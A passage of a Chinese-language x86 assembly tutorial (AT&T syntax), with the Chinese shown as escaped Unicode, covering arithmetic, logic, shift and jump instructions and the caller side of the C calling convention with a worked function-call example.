<reg inc <mem dec <reg dec <mem \u4f8b\u5b50 dec %eax ;EAX \u4e2d\u7684\u503c\u51cf\u53bb 1 incl var(,1) ;\u5c06 var \u6240\u4ee3\u8868\u7684 32 \u4f4d\u6574\u6570\u52a0\u4e0a 1. imul \u6574\u6570\u76f8\u4e58 imul \u6307\u4ee4\u6709\u4e24\u79cd\u57fa\u672c\u683c\u5f0f : \u7b2c\u4e00\u79cd\u662f 2 \u4e2a\u53c2\u6570\u7684 ( \u770b\u4e0b\u9762\u8bed\u6cd5\u5f00\u59cb\u4e24\u6761 ); \u7b2c\u4e8c\u79cd\u683c\u5f0f\u662f 3 \u4e2a\u53c2\u6570\u7684 ( \u770b\u4e0b\u9762\u8bed\u6cd5\u6700\u540e\u4e24\u6761 ). 2 \u4e2a\u53c2\u6570\u7684\u8fd9\u79cd\u683c\u5f0f, \u5148\u662f\u5c06\u4e24\u4e2a\u53c2\u6570\u76f8\u4e58, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u5230\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d. \u8fd0\u7b97\u7ed3\u679c ( \u5373\u7b2c\u4e8c\u4e2a\u53c2\u6570 ) \u5fc5\u987b\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668. 3 \u4e2a\u53c2\u6570\u7684\u8fd9\u79cd\u683c\u5f0f, \u5148\u662f\u5c06\u5b83\u7684\u7b2c 1 \u4e2a\u53c2\u6570\u548c\u7b2c 2 \u4e2a\u53c2\u6570\u76f8\u4e58, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u5230\u7b2c 3 \u4e2a\u53c2\u6570\u4e2d, \u5f53\u7136, \u7b2c 3 \u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668. \u6b64\u5916, \u7b2c 1 \u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u4e00\u4e2a\u5e38\u6570. \u8bed\u6cd5 imul <reg32, <reg32 imul <mem, <reg32 imul <con, <reg32, <reg32 imul <con, <mem, <reg32 \u4f8b\u5b50 imul (%ebx), %eax ;\u5c06 EAX \u4e2d\u7684 32 \u4f4d\u6574\u6570, \u4e0e EBX \u4e2d\u7684\u5185\u5bb9\u6240\u6307\u7684\u5185\u5b58\u5355\u5143, \u76f8\u4e58, \u7136\u540e\u628a\u7ed3\u679c\u5b58\u5230 EAX \u4e2d. imul $25, %edi, %esi ;ESI \u88ab\u8bbe\u7f6e\u4e3a EDI * 25. idiv \u6574\u6570\u76f8\u9664 idiv \u53ea\u6709\u4e00\u4e2a\u64cd\u4f5c\u6570\uff0c\u6b64\u64cd\u4f5c\u6570\u4e3a\u9664\u6570\uff0c\u800c\u88ab\u9664\u6570\u5219\u4e3a EDX : EAX \u4e2d\u7684\u5185\u5bb9\uff08\u4e00\u4e2a64\u4f4d\u7684\u6574\u6570\uff09\uff0c \u9664\u6cd5\u7ed3\u679c ( \u5546 ) \u5b58\u5728 EAX \u4e2d, \u800c\u6240\u5f97\u7684\u4f59\u6570\u5b58\u5728 EDX \u4e2d. \u8bed\u6cd5 idiv <reg32 idiv <mem \u4f8b\u5b50 idiv %ebx ;\u7528 EDX : EAX \u7684\u503c\u9664\u4ee5 EBX \u7684\u503c. \u5546\u5b58\u653e\u5728 EAX \u4e2d, \u4f59\u6570\u5b58\u653e\u5728 EDX \u4e2d. idivw (%ebx) ;\u5c06 EDX : EAX \u7684\u503c\u9664\u4ee5\u5b58\u50a8\u5728 EBX \u6240\u5bf9\u5e94\u5185\u5b58\u5355\u5143\u7684 32 \u4f4d\u503c. \u5546\u5b58\u653e\u5728 EAX \u4e2d, \u4f59\u6570\u5b58\u653e\u5728 EDX \u4e2d. and, or, xor \u6309\u4f4d\u903b\u8f91 \u4e0e, \u6216, \u5f02\u6216 \u8fd0\u7b97 \u8fd9\u4e9b\u6307\u4ee4\u5206\u522b\u5bf9\u5b83\u4eec\u7684\u53c2\u6570\u8fdb\u884c\u76f8\u5e94\u7684\u903b\u8f91\u8fd0\u7b97, \u8fd0\u7b97\u7ed3\u679c\u5b58\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e2d. \u8bed\u6cd5 and <reg, <reg and <mem, <reg and <reg, <mem and <con, <reg and <con, <mem or <reg, <reg or <mem, <reg or <reg, <mem or <con, <reg or <con, <mem xor <reg, <reg xor <mem, <reg xor <reg, <mem xor <con, <reg xor <con, <mem \u4f8b\u5b50 and $0x0F, %eax ;\u53ea\u7559\u4e0b EAX \u4e2d\u6700\u540e 4 \u4f4d\u6570\u5b57 (\u4e8c\u8fdb\u5236\u4f4d) xor %edx, %edx ;\u5c06 EDX \u7684\u503c\u5168\u90e8\u8bbe\u7f6e\u6210 0 not \u903b\u8f91\u4f4d\u8fd0\u7b97 \u975e \u5bf9\u53c2\u6570\u8fdb\u884c\u903b\u8f91\u975e\u8fd0\u7b97, \u5373\u7ffb\u8f6c\u53c2\u6570\u4e2d\u6240\u6709\u4f4d\u7684\u503c. \u8bed\u6cd5 not <reg not <mem \u4f8b\u5b50 not %eax ;\u5c06 EAX \u7684\u6240\u6709\u503c\u7ffb\u8f6c. neg \u53d6\u8d1f\u6307\u4ee4 \u53d6\u53c2\u6570\u7684\u4e8c\u8fdb\u5236\u8865\u7801\u8d1f\u6570. \u76f4\u63a5\u770b\u4f8b\u5b50\u4e5f\u8bb8\u4f1a\u66f4\u597d\u61c2. \u8bed\u6cd5 neg <reg neg <mem \u4f8b\u5b50 neg %eax ;EAX \u2192 -EAX shl, shr \u6309\u4f4d\u5de6\u79fb\u6216\u8005\u53f3\u79fb \u8fd9\u4e24\u4e2a\u6307\u4ee4\u5bf9\u7b2c\u4e00\u4e2a\u53c2\u6570\u8fdb\u884c\u4f4d\u8fd0\u7b97, \u79fb\u52a8\u7684\u4f4d\u6570\u7531\u7b2c\u4e8c\u4e2a\u53c2\u6570\u51b3\u5b9a, \u79fb\u52a8\u8fc7\u540e\u7684\u7a7a\u4f4d\u62ff 0 \u8865\u4e0a.\u88ab\u79fb\u7684\u53c2\u6570\u6700\u591a\u53ef\u4ee5\u88ab\u79fb 31 \u4f4d. \u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u662f 8 \u4f4d\u5e38\u6570\u6216\u8005\u5bc4\u5b58\u5668 CL. \u5728\u4efb\u610f\u60c5\u51b5\u4e0b, \u5927\u4e8e 31 \u7684\u79fb\u4f4d\u90fd\u9ed8\u8ba4\u662f\u4e0e 32 \u53d6\u6a21. \u8bed\u6cd5 shl <con8, <reg shl <con8, <mem shl %cl, <reg shl %cl, <mem shr <con8, <reg shr <con8, <mem shr %cl, <reg shr %cl, <mem \u4f8b\u5b50 shl $1, %eax ;\u5c06 EAX \u7684\u503c\u4e58\u4ee5 2 (\u5982\u679c\u6700\u9ad8\u6709\u6548\u4f4d\u662f 0 \u7684\u8bdd) shr %cl, %ebx ;\u5c06 EBX \u7684\u503c\u9664\u4ee5 2n, \u5176\u4e2d n \u4e3a CL \u4e2d\u7684\u503c, \u8fd0\u7b97\u6700\u7ec8\u7ed3\u679c\u5b58\u5230 EBX \u4e2d. \u4f60\u4e5f\u8bb8\u4f1a\u60f3, \u660e\u660e\u53ea\u662f\u628a\u6570\u5b57\u4e8c\u8fdb\u5236\u79fb\u4e86 1 \u4f4d, \u7ed3\u679c\u5374\u662f\u7b49\u4e8e\u8fd9\u4e2a\u6570\u5b57\u4e58\u4ee5 2.\u4ec0\u4e48\u60c5\u51b5 ? \u8fd9\u51e0\u4e2a\u4f4d\u8fd0\u7b97\u7684\u7ed3\u679c\u548c\u8ba1\u7b97\u673a\u8868\u793a\u6570\u5b57\u7684\u539f\u7406\u6709\u5173,\u8bf7\u770b\u672c\u7ae0\u9644\u5f55\u7684\u8ba1\u7b97\u673a\u6570\u5b57\u8868\u793a. 3.3.4.3 \u6d41\u7a0b\u63a7\u5236\u6307\u4ee4 x86 \u5904\u7406\u5668\u6709\u4e00\u4e2a\u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668 ( EIP ), \u8be5\u5bc4\u5b58\u5668\u4e3a 32 \u4f4d\u5bc4\u5b58\u5668, \u5b83\u7528\u6765\u5728\u5185\u5b58\u4e2d\u6307\u793a\u6211\u4eec\u8f93\u5165\u6c47\u7f16\u6307\u4ee4\u7684\u4f4d\u7f6e. \u5c31\u662f\u8bf4\u8fd9\u4e2a\u5bc4\u5b58\u5668\u6307\u5411\u54ea\u4e2a\u5185\u5b58\u5355\u5143, \u90a3\u4e2a\u5355\u5143\u5b58\u50a8\u7684\u673a\u5668\u7801\u5c31\u662f\u7a0b\u5e8f\u6267\u884c\u7684\u6307\u4ee4. \u901a\u5e38\u5b83\u662f\u6307\u5411\u6211\u4eec\u7a0b\u5e8f\u8981\u6267\u884c\u7684 \u4e0b\u4e00\u6761\u6307\u4ee4. \u4f46\u662f\u4f60\u4e0d\u80fd\u76f4\u63a5\u64cd\u4f5c EIP \u5bc4\u5b58\u5668, \u4f60\u9700\u8981\u6d41\u7a0b\u63a7\u5236\u6307\u4ee4\u6765\u9690\u5f0f\u5730\u7ed9\u5b83\u8d4b\u503c. \u6211\u4eec\u4f7f\u7528\u7b26\u53f7 <label \u6765\u5f53\u4f5c\u7a0b\u5e8f\u4e2d\u7684\u6807\u7b7e. \u901a\u8fc7\u8f93\u5165\u6807\u7b7e\u540d\u79f0\u540e\u8ddf\u5192\u53f7, \u53ef\u4ee5\u5c06\u6807\u7b7e\u63d2\u5165 x86 \u6c47\u7f16\u4ee3\u7801\u6587\u672c\u4e2d\u7684\u4efb\u4f55\u4f4d\u7f6e. \u4f8b\u5982 : mov 8(%ebp), %esi begin: xor %ecx, %ecx mov (%esi), %eax \u8be5\u4ee3\u7801\u7247\u6bb5\u4e2d\u7684\u7b2c\u4e8c\u6bb5\u88ab\u5957\u4e0a\u4e86 \" begin \" \u8fd9\u4e2a\u6807\u7b7e. \u5728\u4ee3\u7801\u7684\u5176\u5b83\u5730\u65b9, \u6211\u4eec\u53ef\u4ee5\u7528 \" begin \" \u8fd9\u4e2a\u6807\u7b7e\u4ece\u800c\u66f4\u65b9\u4fbf\u5730\u6765\u5f15\u7528\u8fd9\u6bb5\u6307\u4ee4\u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e. \u8fd9\u4e2a\u6807\u7b7e\u53ea\u662f\u7528\u6765\u66f4\u65b9\u4fbf\u5730\u8868\u793a\u4f4d\u7f6e\u7684, \u5b83\u5e76\u4e0d\u662f\u7528\u6765\u4ee3\u8868\u67d0\u4e2a 32 \u4f4d\u503c. jmp \u8df3\u8f6c\u6307\u4ee4 \u5c06\u7a0b\u5e8f\u8df3\u8f6c\u5230\u53c2\u6570\u6307\u5b9a\u7684\u5185\u5b58\u5730\u5740, \u7136\u540e\u6267\u884c\u8be5\u5185\u5b58\u5730\u5740\u7684\u6307\u4ee4. \u8bed\u6cd5 jmp <label \u4f8b\u5b50 jmp begin ;\u8df3\u8f6c\u5230\u6253\u4e86 \" begin \" \u8fd9\u4e2a\u6807\u7b7e\u7684\u5730\u65b9 jcondition \u6709\u6761\u4ef6\u7684\u8df3\u8f6c \u8fd9\u4e9b\u6307\u4ee4\u662f\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4, \u5b83\u4eec\u57fa\u4e8e\u4e00\u7ec4\u6761\u4ef6\u4ee3\u7801\u7684\u72b6\u6001, \u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801\u7684\u72b6\u6001\u5b58\u653e\u5728\u79f0\u4e3a\u673a\u5668\u72b6\u6001\u5b57 ( machine status word ) \u7684\u7279\u6b8a\u5bc4\u5b58\u5668\u4e2d. \u673a\u5668\u72b6\u6001\u5b57\u7684\u5185\u5bb9\u5305\u62ec\u5173\u4e8e\u6700\u540e\u6267\u884c\u7684\u7b97\u672f\u8fd0\u7b97\u7684\u4fe1\u606f. \u4f8b\u5982, \u8fd9\u4e2a\u5b57\u7684\u4e00\u4e2a\u4f4d\u8868\u793a\u6700\u540e\u7684\u7ed3\u679c\u662f\u5426\u4e3a 0. \u53e6\u4e00\u4e2a\u4f4d\u8868\u793a\u6700\u540e\u7ed3\u679c\u662f\u5426\u4e3a\u8d1f\u6570. \u57fa\u4e8e\u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801, \u53ef\u4ee5\u6267\u884c\u8bb8\u591a\u6761\u4ef6\u8df3\u8f6c. \u4f8b\u5982, \u5982\u679c\u6700\u540e\u4e00\u6b21\u7b97\u672f\u8fd0\u7b97\u7ed3\u679c\u4e3a 0, \u5219 jz \u6307\u4ee4\u5c31\u662f\u8df3\u8f6c\u5230\u6307\u5b9a\u53c2\u6570\u6807\u7b7e. \u5426\u5219, \u7a0b\u5e8f\u5c31\u6309\u7167\u6d41\u7a0b\u8fdb\u5165\u4e0b\u4e00\u6761\u6307\u4ee4. \u8bb8\u591a\u6761\u4ef6\u5206\u652f\u7684\u540d\u79f0\u90fd\u662f\u5f88\u76f4\u89c2\u7684, \u8fd9\u4e9b\u6307\u4ee4\u7684\u8fd0\u884c, \u90fd\u548c\u4e00\u4e2a\u7279\u6b8a\u7684\u6bd4\u8f83\u6307\u4ee4\u6709\u5173, cmp ( \u89c1\u4e0b\u6587 ). \u4f8b\u5982, \u50cf jle \u548c jne \u8fd9\u79cd\u6307\u4ee4, \u5b83\u4eec\u9996\u5148\u5bf9\u53c2\u6570\u8fdb\u884c cmp \u64cd\u4f5c. \u8bed\u6cd5 je <label ;\u5f53\u76f8\u7b49\u7684\u65f6\u5019\u8df3\u8f6c jne <label ;\u5f53\u4e0d\u76f8\u7b49\u7684\u65f6\u5019\u8df3\u8f6c jz <label ;\u5f53\u6700\u540e\u7ed3\u679c\u4e3a 0 \u7684\u65f6\u5019\u8df3\u8f6c jg <label ;\u5f53\u5927\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c jge <label ;\u5f53\u5927\u4e8e\u7b49\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c jl <label ;\u5f53\u5c0f\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c jle <label ;\u5f53\u5c0f\u4e8e\u7b49\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c \u4f8b\u5b50 cmp %ebx, %eax jle done ;\u5982\u679c EAX \u7684\u503c\u5c0f\u4e8e\u7b49\u4e8e EBX \u7684\u503c, \u5c31\u8df3\u8f6c\u5230 \" done \" \u6807\u7b7e, \u5426\u5219\u5c31\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4. cmp \u6bd4\u8f83\u6307\u4ee4 \u6bd4\u8f83\u4e24\u4e2a\u53c2\u6570\u7684\u503c, \u9002\u5f53\u5730\u8bbe\u7f6e\u673a\u5668\u72b6\u6001\u5b57\u4e2d\u7684\u6761\u4ef6\u4ee3\u7801. \u6b64\u6307\u4ee4\u4e0esub\u6307\u4ee4\u7c7b\u4f3c\uff0c\u4f46\u662fcmp\u4e0d\u7528\u5c06\u8ba1\u7b97\u7ed3\u679c\u4fdd\u5b58\u5728\u64cd\u4f5c\u6570\u4e2d. \u8bed\u6cd5 cmp <reg, <reg cmp <mem, <reg cmp <reg, <mem cmp <con, <reg \u4f8b\u5b50 cmpb $10, (%ebx) jeq loop ;\u5982\u679c EBX \u7684\u503c\u7b49\u4e8e\u6574\u6570\u5e38\u91cf 10, \u5219\u8df3\u8f6c\u5230\u6807\u7b7e \" loop \" \u7684\u4f4d\u7f6e. call, ret \u5b50\u7a0b\u5e8f\u8c03\u7528\u4e0e\u8fd4\u56de \u8fd9\u4e24\u4e2a\u6307\u4ee4\u5b9e\u73b0\u5b50\u7a0b\u5e8f\u7684\u8c03\u7528\u548c\u8fd4\u56de. call \u6307\u4ee4\u9996\u5148\u5c06\u5f53\u524d\u4ee3\u7801\u4f4d\u7f6e\u63a8\u5230\u5185\u5b58\u4e2d\u786c\u4ef6\u652f\u6301\u7684\u6808\u5185\u5b58\u4e0a ( \u8bf7\u770b push \u6307\u4ee4 ), \u7136\u540e\u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u6807\u7b7e\u53c2\u6570\u6307\u5b9a\u7684\u4ee3\u7801\u4f4d\u7f6e. \u4e0e\u7b80\u5355\u7684 jmp \u6307\u4ee4\u4e0d\u540c, call \u6307\u4ee4\u4fdd\u5b58\u4e86\u5b50\u7a0b\u5e8f\u5b8c\u6210\u65f6\u8fd4\u56de\u7684\u4f4d\u7f6e. \u5c31\u662f call \u6307\u4ee4\u7ed3\u675f\u540e, \u8fd4\u56de\u5230\u8c03\u7528\u4e4b\u524d\u7684\u5730\u5740. ret \u6307\u4ee4\u5b9e\u73b0\u5b50\u7a0b\u5e8f\u7684\u8fd4\u56de. \u8be5\u6307\u4ee4\u9996\u5148\u4ece\u6808\u4e2d\u53d6\u51fa\u4ee3\u7801 ( \u7c7b\u4f3c\u4e8e pop \u6307\u4ee4 ). \u7136\u540e\u5b83\u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u68c0\u7d22\u5230\u7684\u4ee3\u7801\u4f4d\u7f6e. \u8bed\u6cd5 call <label ret 3.3.5 \u8c03\u7528\u7ea6\u5b9a Calling Convention \u4e3a\u4e86\u65b9\u4fbf\u4e0d\u540c\u7684\u7a0b\u5e8f\u5458\u53bb\u5206\u4eab\u4ee3\u7801\u548c\u8fd0\u884c\u5e93, \u5e76\u7b80\u5316\u4e00\u822c\u5b50\u7a0b\u5e8f\u7684\u4f7f\u7528, \u7a0b\u5e8f\u5458\u4eec\u901a\u5e38\u4f1a\u9075\u5b88\u4e00\u5b9a\u7684\u7ea6\u5b9a ( Calling Convention ). \u8c03\u7528\u7ea6\u5b9a\u662f\u5173\u4e8e\u5982\u4f55\u4ece\u4f8b\u7a0b\u8c03\u7528\u548c\u8fd4\u56de\u7684\u534f\u8bae. \u4f8b\u5982\uff0c\u7ed9\u5b9a\u4e00\u7ec4\u8c03\u7528\u7ea6\u5b9a\u89c4\u5219\uff0c\u7a0b\u5e8f\u5458\u4e0d\u9700\u8981\u68c0\u67e5\u5b50\u4f8b\u7a0b\u7684\u5b9a\u4e49\u6765\u786e\u5b9a\u5982\u4f55\u5c06\u53c2\u6570\u4f20\u9012\u7ed9\u8be5\u5b50\u4f8b\u7a0b. \u6b64\u5916\uff0c\u7ed9\u5b9a\u4e00\u7ec4\u8c03\u7528\u7ea6\u5b9a\u89c4\u5219\uff0c\u53ef\u4ee5\u4f7f\u9ad8\u7ea7\u8bed\u8a00\u7f16\u8bd1\u5668\u9075\u5faa\u89c4\u5219\uff0c\u4ece\u800c\u5141\u8bb8\u624b\u52a8\u7f16\u7801\u7684\u6c47\u7f16\u8bed\u8a00\u4f8b\u7a0b\u548c\u9ad8\u7ea7\u8bed\u8a00\u4f8b\u7a0b\u76f8\u4e92\u8c03\u7528. \u6211\u4eec\u5c06\u8bb2\u89e3\u88ab\u5e7f\u6cdb\u4f7f\u7528\u7684 C \u8bed\u8a00\u8c03\u7528\u7ea6\u5b9a. \u9075\u5faa\u6b64\u7ea6\u5b9a\u5c06\u5141\u8bb8\u60a8\u7f16\u5199\u53ef\u4ece C ( \u548cC ++ ) \u4ee3\u7801\u5b89\u5168\u5730\u8c03\u7528\u7684\u6c47\u7f16\u8bed\u8a00\u5b50\u4f8b\u7a0b, \u5e76\u4e14\u8fd8\u5141\u8bb8\u60a8\u4ece\u6c47\u7f16\u8bed\u8a00\u4ee3\u7801\u8c03\u7528 C \u51fd\u6570\u5e93. C \u8c03\u7528\u7ea6\u5b9a\u5f88\u5927\u7a0b\u5ea6\u4e0a\u53d6\u51b3\u4e8e\u4f7f\u7528\u786c\u4ef6\u652f\u6301\u7684\u6808\u5185\u5b58. \u5b83\u57fa\u4e8e push , pop , call \u548c ret \u6307\u4ee4. \u5b50\u7a0b\u5e8f\u7684\u53c2\u6570\u5728\u6808\u4e0a\u4f20\u9012. \u5bc4\u5b58\u5668\u4fdd\u5b58\u5728\u6808\u4e2d, \u5b50\u7a0b\u5e8f\u4f7f\u7528\u7684\u5c40\u90e8\u53d8\u91cf\u653e\u5728\u6808\u4e2d. \u5728\u5927\u591a\u6570\u5904\u7406\u5668\u4e0a\u5b9e\u73b0\u7684\u9ad8\u7ea7\u8fc7\u7a0b\u8bed\u8a00\u90fd\u4f7f\u7528\u4e86\u7c7b\u4f3c\u7684\u8c03\u7528\u7ea6\u5b9a. \u8c03\u7528\u7ea6\u5b9a\u5206\u4e3a\u4e24\u7ec4. \u7b2c\u4e00\u7ec4\u89c4\u5219\u662f\u9762\u5411\u5b50\u4f8b\u7a0b\u7684\u8c03\u7528\u8005 ( Caller ) \u7684, \u7b2c\u4e8c\u7ec4\u89c4\u5219\u9762\u5411\u5b50\u4f8b\u7a0b\u7684\u7f16\u5199\u8005, \u5373\u88ab\u8c03\u7528\u8005 ( Callee ). \u5e94\u8be5\u5f3a\u8c03\u7684\u662f, \u9519\u8bef\u5730\u9075\u5b88\u8fd9\u4e9b\u89c4\u5219\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u7684\u81f4\u547d\u9519\u8bef, \u56e0\u4e3a\u6808\u5c06\u5904\u4e8e\u4e0d\u4e00\u81f4\u7684\u72b6\u6001; \u56e0\u6b64, \u5728\u4f60\u81ea\u5df1\u7684\u5b50\u4f8b\u7a0b\u4e2d\u5b9e\u73b0\u8c03\u7528\u7ea6\u5b9a\u7684\u65f6\u5019, \u52a1\u5fc5\u5f53\u5fc3. \u5c06\u8c03\u7528\u7ea6\u5b9a\u53ef\u89c6\u5316\u7684\u4e00\u79cd\u597d\u65b9\u6cd5\u662f, \u5728\u5b50\u4f8b\u7a0b\u6267\u884c\u671f\u95f4\u753b\u4e00\u4e2a\u6808\u5185\u5b58\u9644\u8fd1\u7684\u56fe. \u56fe 2 \u63cf\u7ed8\u4e86\u5728\u6267\u884c\u5177\u6709\u4e09\u4e2a\u53c2\u6570\u548c\u4e09\u4e2a\u5c40\u90e8\u53d8\u91cf\u7684\u5b50\u7a0b\u5e8f\u671f\u95f4\u6808\u7684\u5185\u5bb9. \u6808\u4e2d\u63cf\u7ed8\u7684\u5355\u5143\u90fd\u662f 32 \u4f4d\u5185\u5b58\u5355\u5143, \u56e0\u6b64\u8fd9\u4e9b\u5355\u5143\u7684\u5185\u5b58\u5730\u5740\u76f8\u9694 4 \u4e2a\u5b57\u8282. \u7b2c\u4e00\u4e2a\u53c2\u6570\u4f4d\u4e8e\u8ddd\u57fa\u6307\u9488 8 \u4e2a\u5b57\u8282\u7684\u504f\u79fb\u5904. \u5728\u6808\u53c2\u6570\u7684\u4e0a\u65b9 ( \u548c\u57fa\u6307\u9488\u4e0b\u65b9 ), call \u6307\u4ee4\u5728\u8fd9\u653e\u4e86\u8fd4\u56de\u5730\u5740, \u4ece\u800c\u5bfc\u81f4\u4ece\u57fa\u6307\u9488\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u6709\u989d\u5916 4 \u4e2a\u5b57\u8282\u7684\u504f\u79fb\u91cf. \u5f53 ret \u6307\u4ee4\u7528\u4e8e\u4ece\u5b50\u7a0b\u5e8f\u8fd4\u56de\u65f6, \u5b83\u5c06\u8df3\u8f6c\u5230\u6808\u4e2d\u7684\u8fd4\u56de\u5730\u5740. 3.3.5.1 \u8c03\u7528\u8005\u7ea6\u5b9a Caller Rules \u8981\u8fdb\u884c\u5b50\u7a0b\u5e8f\u8c03\u7528, \u8c03\u7528\u8005\u5e94\u8be5 : \u5728\u8c03\u7528\u5b50\u4f8b\u7a0b\u4e4b\u524d, \u8c03\u7528\u8005\u5e94\u8be5\u4fdd\u5b58\u6307\u5b9a\u8c03\u7528\u8005\u4fdd\u5b58 ( Caller-saved )\u7684\u67d0\u4e9b\u5bc4\u5b58\u5668\u7684\u5185\u5bb9. \u8c03\u7528\u8005\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u662f EAX, ECX, EDX. \u7531\u4e8e\u88ab\u8c03\u7528\u7684\u5b50\u7a0b\u5e8f\u53ef\u4ee5\u4fee\u6539\u8fd9\u4e9b\u5bc4\u5b58\u5668, \u6240\u4ee5\u5982\u679c\u8c03\u7528\u8005\u5728\u5b50\u4f8b\u7a0b\u8fd4\u56de\u540e\u4f9d\u8d56\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c, \u8c03\u7528\u8005\u5fc5\u987b\u5c06\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u5165\u6808, \u7136\u540e\u5c31\u53ef\u4ee5\u5728\u5b50\u4f8b\u7a0b\u8fd4\u56de\u540e\u6062\u590d\u5b83\u4eec. \u8981\u628a\u53c2\u6570\u4f20\u9012\u7ed9\u5b50\u4f8b\u7a0b, \u4f60\u53ef\u4ee5\u5728\u8c03\u7528\u4e4b\u524d\u628a\u53c2\u6570\u5165\u6808. \u53c2\u6570\u7684\u5165\u6808\u987a\u5e8f\u5e94\u8be5\u662f\u53cd\u7740\u7684, \u5c31\u662f\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u5e94\u8be5\u6700\u5148\u5165\u6808. \u968f\u7740\u6808\u5185\u5b58\u5730\u5740\u589e\u5927, \u7b2c\u4e00\u4e2a\u53c2\u6570\u5c06\u5b58\u50a8\u5728\u6700\u4f4e\u7684\u5730\u5740, \u5728\u5386\u53f2\u4e0a, \u8fd9\u79cd\u53c2\u6570\u7684\u53cd\u8f6c\u7528\u4e8e\u5141\u8bb8\u51fd\u6570\u4f20\u9012\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570. \u8981\u8c03\u7528\u5b50\u4f8b\u7a0b, \u8bf7\u4f7f\u7528 call \u6307\u4ee4. \u8be5\u6307\u4ee4\u5c06\u8fd4\u56de\u5730\u5740\u5b58\u5230\u6808\u4e0a, \u5e76\u8df3\u8f6c\u5230\u5b50\u7a0b\u5e8f\u7684\u4ee3\u7801. \u8fd9\u4e2a\u4f1a\u8c03\u7528\u5b50\u7a0b\u5e8f, \u8fd9\u4e2a\u5b50\u7a0b\u5e8f\u5e94\u8be5\u9075\u5faa\u4e0b\u9762\u7684\u88ab\u8c03\u7528\u8005\u7ea6\u5b9a. \u5b50\u7a0b\u5e8f\u8fd4\u56de\u540e ( \u7d27\u8ddf\u8c03\u7528\u6307\u4ee4\u540e ), \u8c03\u7528\u8005\u53ef\u4ee5\u671f\u671b\u5728\u5bc4\u5b58\u5668 EAX \u4e2d\u627e\u5230\u5b50\u4f8b\u7a0b\u7684\u8fd4\u56de\u503c. \u8981\u6062\u590d\u673a\u5668\u72b6\u6001 ( machine state ), \u8c03\u7528\u8005\u5e94\u8be5 : \u4ece\u6808\u4e2d\u5220\u9664\u53c2\u6570, \u8fd9\u4f1a\u628a\u6808\u6062\u590d\u5230\u8c03\u7528\u4e4b\u524d\u7684\u72b6\u6001. \u628a EAX, ECX, EDX \u4e4b\u524d\u5165\u6808\u7684\u5185\u5bb9\u7ed9\u51fa\u6808, \u8c03\u7528\u8005\u53ef\u4ee5\u5047\u8bbe\u5b50\u4f8b\u7a0b\u6ca1\u6709\u4fee\u6539\u5176\u5b83\u5bc4\u5b58\u5668. \u4f8b\u5b50 \u4e0b\u9762\u7684\u4ee3\u7801\u5c31\u662f\u4e2a\u6d3b\u751f\u751f\u7684\u4f8b\u5b50, \u5b83\u5c55\u793a\u4e86\u9075\u5faa\u7ea6\u5b9a\u7684\u51fd\u6570\u8c03\u7528. \u8c03\u7528\u8005\u6b63\u5728\u8c03\u7528\u4e00\u4e2a\u5e26\u6709 3 \u4e2a\u6574\u6570\u53c2\u6570\u7684\u51fd\u6570 myFunc. \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f EAX, \u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5e38\u6570 216; \u7b2c\u4e09\u4e2a\u53c2\u6570\u4f4d\u4e8e EBX \u7684\u503c\u6240\u4ee3\u8868\u7684\u5185\u5b58\u5730\u5740. push (%ebx) ;\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u6700\u5148\u5165\u6808 push $216 ;\u628a\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5165\u6808 push %eax ;\u7b2c\u4e00\u4e2a\u53c2\u6570\u6700\u540e\u5165\u6808 call myFunc ;\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570 ( \u5047\u8bbe\u4ee5 C \u8bed\u8a00\u7684\u6a21\u5f0f\u547d\u540d ) add $12, %esp \u6ce8\u610f, \u5728\u8c03\u7528\u8fd4\u56de\u540e, \u8c03\u7528\u8005\u4f7f\u7528 add \u6307\u4ee4\u6765\u6e05\u7406\u6808\u5185\u5b58. \u6211\u4eec\u6808\u5185\u5b58\u4e2d\u6709 12 \u4e2a\u5b57\u8282 ( 3 \u4e2a\u53c2\u6570, \u6bcf\u4e2a\u53c2\u6570 4 \u4e2a\u5b57\u8282 ), \u7136\u540e\u6808\u5185\u5b58\u5730\u5740\u589e\u5927. \u56e0\u6b64, \u4e3a\u4e86\u6446\u8131\u6389\u8fd9\u4e9b\u53c2\u6570, \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5f80\u6808\u91cc\u9762\u52a0\u4e2a 12. myFunc \u751f\u6210\u7684\u7ed3\u679c\u73b0\u5728\u53ef\u4ee5\u6709\u7528\u4e8e\u5bc4\u5b58\u5668 EAX. \u8c03\u7528\u8005\u4fdd\u5b58 ( Caller-saved ) \u7684\u5bc4\u5b58\u5668 ( ECX, EDX ) \u7684\u503c\u53ef\u80fd\u5df2\u7ecf\u88ab\u4fee\u6539. 